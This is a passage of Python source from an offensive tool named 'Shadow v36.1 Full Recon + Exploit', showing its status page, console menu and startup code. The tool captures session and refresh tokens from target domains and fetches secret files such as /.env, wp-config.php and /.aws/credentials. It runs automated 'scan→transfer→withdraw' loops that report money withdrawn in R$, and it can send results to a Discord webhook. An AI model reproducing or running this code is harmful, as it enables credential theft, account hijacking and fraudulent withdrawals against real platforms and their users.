            html = f"""<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Shadow Server v36.1</title>
<style>body{{background:#0a0a0f;color:#e0e0e0;font-family:monospace;padding:20px;}}
h1{{color:#8b5cf6;}}.stat{{margin:8px 0;font-size:14px;}}.green{{color:#4ade80;}}.red{{color:#f87171;}}
.box{{background:#111118;border:1px solid #1e1e2e;border-radius:8px;padding:15px;margin:10px 0;}}
a{{color:#8b5cf6;text-decoration:none;}}</style></head><body>
<h1>?? Shadow Server v36.1</h1>
<div class="box">
<p>Status: <span class="green">{ws} Online</span> | ws://localhost:8766 | http://localhost:8765</p>
<p class="stat">?? Tokens: <b>{tokens}</b> | ?? Vulns: <b class="{'red' if vulns>0 else 'green'}">{vulns}</b> | ?? Domains: <b>{domains}</b></p>
<p class="stat">?? SSE: <b>{sse}</b> | ?? Refresh: <b>{refresh}</b> | ?? Conns: <b>{conns}</b></p>
<p style="font-size:11px;color:#555;">API: GET /status | POST /capture | POST /export | POST /clear</p>
</div>
</body></html>"""
            self.wfile.write(html.encode('utf-8'))

def start_http():
    httpd = HTTPServer(("0.0.0.0", 8765), HTTPHandler)
    log.info("?? HTTP: http://0.0.0.0:8765")
    httpd.serve_forever()

# ============================================================
# CONSOLE UI
# ============================================================
def console_ui():
    global DISCORD_WEBHOOK, AUTO_SAVE_INTERVAL
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        with data_lock:
            current = data.get('current_account')
            ws_status = "?? Online" if data['websocket_connected'] else "?? Offline"
            uptime = int(time.time()) - data['stats'].get('start_time', int(time.time()))
            hours, rem = divmod(uptime, 3600)
            mins, secs = divmod(rem, 60)
            conns = data['connections']
            tokens_n = len(data['tokens'])
            accounts_n = len(data['accounts'])
            domains_n = len(data['domains'])
            vulns_n = len(data['vulnerabilities'])
            cors_n = len([t for r in data['cors_tests'] for t in r.get('tests',[]) if t.get('dangerous')])
            graphql_n = len([g for g in data['graphql_tests'] if g.get('endpoints',[])])
            subs_n = len([s for r in data['subdomain_results'] for s in r.get('subdomains',[])])
            sse_n = len(data.get('sse_captures',[]))
            refresh_n = len(data.get('refresh_tokens',[]))
            house_bal = data['house_balance']
            transfers_n = len(data['transfers'])
            withdrawals_n = len(data['withdrawals'])
            autoscan = data['auto_scan_complete']

        _sep = '-' * 55
        print(f"\n  {C.MAGENTA}{C.BOLD}Shadow v36.1  Full Recon + Exploit{C.RESET}")
        print(f"  {C.GRAY}{_sep}{C.RESET}\n")
        print(f"  {icon('connection')} Conns: {conns}  {icon('stable')} WS: {ws_status}  {icon('auto')} Uptime: {hours}h{mins:02d}m{secs:02d}s")
        print(f"  {icon('token')} Tokens: {tokens_n}  {icon('user')} Accounts: {accounts_n}  {icon('domain')} Domains: {domains_n}")
        print(f"  {icon('vuln')} Vulns: {vulns_n}  {icon('cors')} CORS: {cors_n}  {icon('graphql')} GraphQL: {graphql_n}")
        print(f"  {icon('sub')} Subs: {subs_n}  {icon('sse')} SSE: {sse_n}  {icon('refresh')} Refresh: {refresh_n}")
        print()
        print(f"  {C.GRAY}User:{C.RESET}    {current.get('account_id') if current else 'N/A':<20} {C.GRAY}Domain:{C.RESET} {current.get('domain') if current else 'N/A'}")
        print(f"  {C.GRAY}House bal:{C.RESET} R$ {house_bal:,.2f}   {C.GRAY}Transfers:{C.RESET} {transfers_n}   {C.GRAY}Withdraws:{C.RESET} {withdrawals_n}")
        print(f"  {C.GRAY}Auto-Scan:{C.RESET} {'? Done' if autoscan else '? Pending'}")
        print()
        print(f"  {C.GRAY}- Commands -{C.RESET}")
        for cmd, desc in [
            ("flow", "Full flow (scan?transfer?withdraw)"),
            ("autoflow", "Auto-withdraw loop (5 rounds)"),
            ("scan", "Auto-Adapter scan"),
            ("tokens", "List captured tokens"),
            ("vulns", "List vulnerabilities"),
            ("accounts", "List detected accounts"),
            ("secrets", "List extracted secrets"),
            ("sse", "List SSE captures"),
            ("refresh", "List refresh tokens"),
            ("export", "Export data (JSON)"),
            ("report", "Generate HTML report"),
            ("csv", "Export CSV"),
            ("clear", "Clear all data"),
            ("config", "Configure Discord webhook"),
            ("quit", "Exit"),
        ]:
            print(f"    {cmd:<10} - {desc}")
        print()

        try:
            cmd = input(f"  {C.CYAN}? {C.RESET}").strip().lower()

            if cmd in ('quit', 'exit', 'q'):
                break
            elif cmd == 'clear':
                with data_lock:
                    for key in data:
                        if key not in ['connections', 'websocket_connected', 'websocket_retries', 'stats']:
                            if isinstance(data[key], list): data[key] = []
                            elif isinstance(data[key], (int, float)): data[key] = 0
                            elif isinstance(data[key], dict): data[key] = {}
                            elif isinstance(data[key], bool): data[key] = False
                    data['current_account'] = None
                    data['auto_scan_complete'] = False
                print(f"  {C.GREEN}? Data cleared{C.RESET}")
                time.sleep(1)
            elif cmd == 'tokens':
                with data_lock: snapshot = list(data['tokens'])
                print(f"\n  {C.CYAN}?? Tokens ({len(snapshot)}):{C.RESET}")
                for i, t in enumerate(snapshot[-25:]):
                    issues = t.get('jwt_issues', [])
                    admin_flag = ' ??' if any('admin' in i.get('desc','').lower() for i in issues) else ''
                    print(f"    [{i:2d}] {t.get('domain',''):<25} {t.get('userId','N/A'):<10} {t.get('token','')[:45]}...{admin_flag}")
                time.sleep(2)
            elif cmd == 'vulns':
                with data_lock: snapshot = list(data['vulnerabilities'])
                print(f"\n  {C.CYAN}?? Vulnerabilities ({len(snapshot)}):{C.RESET}")
                for v in snapshot[-20:]:
                    sev = v.get('severity', 'medium').upper()
                    color = C.RED if sev in ('CRITICAL', 'HIGH') else C.YELLOW
                    print(f"    {color}[{sev:8s}]{C.RESET} {v.get('type',''):<30} {v.get('desc','')[:55]} | {v.get('domain','')}")
                time.sleep(2)
            elif cmd == 'accounts':
                with data_lock: snapshot = list(data['accounts'])
                print(f"\n  {C.CYAN}?? Accounts ({len(snapshot)}):{C.RESET}")
                for i, a in enumerate(snapshot):
                    print(f"    [{i}] {a.get('account_id','')} @ {a.get('domain','')} | Token: {a.get('token','')[:40]}...")
                time.sleep(2)
            elif cmd == 'sse':
                with data_lock: snapshot = list(data.get('sse_captures', []))
                print(f"\n  {C.CYAN}?? SSE Captures ({len(snapshot)}):{C.RESET}")
                for i, s in enumerate(snapshot[-10:]):
                    print(f"    [{i}] {s.get('domain',''):<25} {s.get('url','')[:50]}...")
                time.sleep(2)
            elif cmd == 'refresh':
                with data_lock: snapshot = list(data.get('refresh_tokens', []))
                print(f"\n  {C.CYAN}?? Refresh Tokens ({len(snapshot)}):{C.RESET}")
                for i, r in enumerate(snapshot[-10:]):
                    print(f"    [{i}] {r.get('domain',''):<25} {r.get('source',''):<15} {r.get('token','')[:40]}...")
                time.sleep(2)
            elif cmd == 'secrets':
                with data_lock: secrets = list(data.get('downloaded_files', []))
                if secrets:
                    print(f"\n  {C.CYAN}?? Secrets ({len(secrets)}):{C.RESET}")
                    for i, s in enumerate(secrets[-20:]):
                        print(f"    [{i:2d}] {s.get('type',''):<20} {s.get('value','')[:50]}... | {s.get('domain','')}")
                else:
                    print(f"\n  {C.GRAY}No secrets yet. Use download first.{C.RESET}")
                time.sleep(2)
            elif cmd == 'export':
                f = export_json()
                print(f"  {C.GREEN}? Exported: {f}{C.RESET}")
                time.sleep(1)
            elif cmd == 'report':
                f = export_html_report()
                print(f"  {C.GREEN}? HTML report: {f}{C.RESET}")
                time.sleep(1)
            elif cmd == 'csv':
                f1, f2 = export_csv()
                print(f"  {C.GREEN}? CSV: {f1}, {f2}{C.RESET}")
                time.sleep(1)
            elif cmd == 'config':
                print(f"\n  {C.CYAN}Current config:{C.RESET}")
                print(f"    Discord webhook: {DISCORD_WEBHOOK or '(not set)'}")
                print(f"    Auto-save: every {AUTO_SAVE_INTERVAL}s")
                new_webhook = input(f"\n  {C.CYAN}New webhook (Enter=skip): {C.RESET}").strip()
                if new_webhook:
                    DISCORD_WEBHOOK = new_webhook
                    try:
                        cfg = {}
                        if CONFIG_FILE.exists():
                            with open(CONFIG_FILE, encoding='utf-8') as f: cfg = json.load(f)
                        cfg['discord_webhook'] = new_webhook
                        with open(CONFIG_FILE, 'w', encoding='utf-8') as f: json.dump(cfg, f, indent=2)
                        print(f"  {C.GREEN}? Config saved{C.RESET}")
                    except Exception as e:
                        print(f"  {C.RED}? Error: {e}{C.RESET}")
                time.sleep(1)
            elif cmd == 'scan':
                with data_lock: acc = data.get('current_account')
                if acc:
                    result = exploit.auto_adapter.run_full_scan(acc)
                    if result.get('all_tokens'):
                        print(f"\n  ?? {C.GREEN}Tokens found!{C.RESET}")
                        tokens = result.get('all_tokens', [])
                        for i, t in enumerate(tokens[:10]):
                            print(f"    [{i}] {t.get('userId')} -> {t.get('token','')[:40]}... ({t.get('method','')})")
                        if len(tokens) > 1:
                            try:
                                choice = input(f"  {C.CYAN}Load which token? (0-{len(tokens)-1}, Enter=0): {C.RESET}").strip()
                                idx = int(choice) if choice else 0
                                idx = max(0, min(idx, len(tokens) - 1))
                            except Exception: idx = 0
                            token_data = tokens[idx]
                            acc_new = {'domain': acc.get('domain'), 'token': token_data.get('token'), 'account_id': token_data.get('userId')}
                            with data_lock:
                                data['current_account'] = acc_new
                            print(f"  ? Token {idx} loaded! User: {token_data.get('userId')}")
                else:
                    print(f"  {C.RED}? No account selected{C.RESET}")
                time.sleep(2)
            elif cmd == 'autoflow':
                with data_lock: acc = data.get('current_account')
                if acc:
                    print(f"\n  {C.MAGENTA}?? Starting auto-withdraw loop...{C.RESET}")
                    result = exploit.auto_withdraw_loop(acc, max_rounds=5, delay=5.0)
                    print(f"\n  {C.CYAN}{'?' * 40}{C.RESET}")
                    print(f"  ?? Auto-flow result: {result['success_rounds']} success / {result['failed_rounds']} failed")
                    print(f"  ?? Total withdrawn: R$ {result['total_withdrawn']:,.2f}")
                else:
                    print(f"  {C.RED}? No account selected{C.RESET}")
                time.sleep(3)
            elif cmd == 'flow':
                with data_lock: acc = data.get('current_account')
                if acc:
                    result = exploit.run_full_flow(acc)
                else:
                    print(f"  {C.RED}? No account selected{C.RESET}")
                time.sleep(3)
            elif cmd == 'download':
                domain = input(f"  {C.CYAN}Domain (Enter=current): {C.RESET}").strip()
                if not domain:
                    with data_lock:
                        acc = data.get('current_account')
                    if acc: domain = acc.get('domain', '')
                if not domain:
                    print(f"  {C.RED}? No domain{C.RESET}")
                    time.sleep(1)
                    continue
                files_to_scan = [
                    ('/.env', 'env'), ('/.env.backup', 'env'), ('/.env.local', 'env'),
                    ('/config.json', 'json'), ('/config.yml', 'yaml'),
                    ('/wp-config.php', 'php'), ('/swagger.json', 'json'),
                    ('/.aws/credentials', 'env'),
                ]
                print(f"\n  {C.CYAN}?? Downloading from {domain}...{C.RESET}")
                for file_path, ftype in files_to_scan:
                    url = f"https://{domain}{file_path}"
                    print(f"  {C.GRAY}? {file_path}{C.RESET}", end=' ')
                    ws_manager._download_file(url, domain, ftype)
                    time.sleep(0.5)
                print(f"\n  {C.GREEN}? Download complete{C.RESET}")
                time.sleep(1)
            else:
                print(f"  {C.RED}? Unknown command{C.RESET}")
                print(f"  {C.GRAY}Commands: flow, autoflow, scan, download, secrets, tokens, vulns, accounts, sse, refresh, export, report, csv, config, clear, quit{C.RESET}")
                time.sleep(1)

        except KeyboardInterrupt:
            break
        except Exception as e:
            print(f"  {C.RED}? Error: {e}{C.RESET}")
            time.sleep(1)

# ============================================================
# MAIN
# ============================================================
def main():
    load_config()

    accounts = load_accounts()
    if accounts and not data.get('accounts'):
        with data_lock:
            data['accounts'] = accounts
        log.info(f"?? Loaded {len(accounts)} accounts from config")

    # FIX: valida expiração do token restaurado do autosave
    if not data.get('accounts'):
        autosaves = sorted(Path(__file__).parent.glob('sombra_autosave_*.json'), key=lambda p: p.stat().st_mtime, reverse=True)
        if autosaves:
            try:
                with open(autosaves[0], encoding='utf-8') as f:
                    saved = json.load(f)
                if saved.get('tokens'):
                    last_token = saved['tokens'][-1]
                    uid = last_token.get('userId')
                    tok = last_token.get('token', '')
                    domain = last_token.get('domain', '').replace('platform.', '')
                    if uid and tok and not token_is_expired(tok):
                        acc = {'account_id': str(uid), 'user_id': str(uid), 'domain': domain, 'token': tok}
                        with data_lock:
                            data['accounts'].append(acc)
                            data['current_account'] = acc
                        log.info(f"?? Restored account from autosave: {uid} @ {domain}")
                    elif uid and tok:
                        log.warning(f"?? Autosave token for {uid} is expired  skipping restore")
            except Exception:
                pass

    print(f"\n  {C.MAGENTA}{C.BOLD}Shadow v36.1  Full Recon + Exploit{C.RESET}")
    print(f"  {C.GRAY}Initializing servers...{C.RESET}\n")

    threading.Thread(target=auto_save, daemon=True).start()
    threading.Thread(target=start_http, daemon=True).start()
    ws_manager.start()

    try:
        console_ui()
    except KeyboardInterrupt:
        print(f"\n  {C.GRAY}Shutting down...{C.RESET}")
    finally:
        ws_manager.stop()
        try:
            export_json()
            log.info("?? Final export saved")
        except Exception:
            pass

if __name__ == "__main__":
    main()
